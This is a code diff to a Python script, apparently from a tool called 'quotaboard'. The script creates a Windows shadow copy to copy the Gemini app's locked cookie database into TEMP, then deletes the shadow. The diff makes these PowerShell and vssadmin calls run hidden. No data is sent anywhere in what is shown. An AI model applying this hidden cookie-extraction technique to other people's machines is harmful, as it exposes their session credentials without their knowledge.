@@ -7,8 +7,8 @@
 import io
 import os
 import shutil
-import subprocess
 import sys
+from quotaboard.background_process import run_hidden
 
 TARGET = os.path.join(os.environ.get("TEMP", "."), "gemini_cookies_vss.db")
 SRC = os.path.join(os.environ.get("APPDATA", ""), "gemini", "Network", "Cookies")
@@ -25,7 +25,7 @@ def _wmi_create_shadow() -> str | None:
         "-MethodName Create -Arguments @{Volume='%s'};"
         "if ($c.ReturnValue -eq 0 -and $c.ShadowID) { $c.ShadowID }" % VOLUME
     )
-    r = subprocess.run([_PWSH, "-NoProfile", "-Command", ps],
+    r = run_hidden([_PWSH, "-NoProfile", "-NonInteractive", "-Command", ps],
                        capture_output=True, text=True, timeout=120)
     out = (r.stdout or "").strip()
     return out if r.returncode == 0 and out else None
@@ -36,7 +36,7 @@ def _shadow_device(shadow_id: str) -> str | None:
         "$s = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq '%s' };"
         "if ($s) { $s.DeviceObject }" % shadow_id
     )
-    r = subprocess.run([_PWSH, "-NoProfile", "-Command", ps],
+    r = run_hidden([_PWSH, "-NoProfile", "-NonInteractive", "-Command", ps],
                        capture_output=True, text=True, timeout=60)
     out = (r.stdout or "").strip()
     return out if r.returncode == 0 and out else None
@@ -44,7 +44,7 @@ def _shadow_device(shadow_id: str) -> str | None:
 
 def _delete_shadow(shadow_id: str) -> None:
     try:
-        subprocess.run(["cmd", "/c", "vssadmin delete shadows /shadow=%s /quiet"
+        run_hidden(["cmd", "/c", "vssadmin delete shadows /shadow=%s /quiet"
                        % shadow_id], capture_output=True, timeout=60)
     except Exception:
         pass
@@ -90,7 +90,7 @@ def main() -> int:
                 os.remove(TARGET)
         except OSError:
             pass
-        r = subprocess.run([_PWSH, "-NoProfile", "-Command", ps],
+        r = run_hidden([_PWSH, "-NoProfile", "-NonInteractive", "-Command", ps],
                            capture_output=True, timeout=120)
         log.write("copy rc=%s stderr=%r\n" % (r.returncode, (r.stderr or b"")[:300]))
         if r.returncode == 0 and os.path.isfile(TARGET) and os.path.getsize(TARGET) > 0:
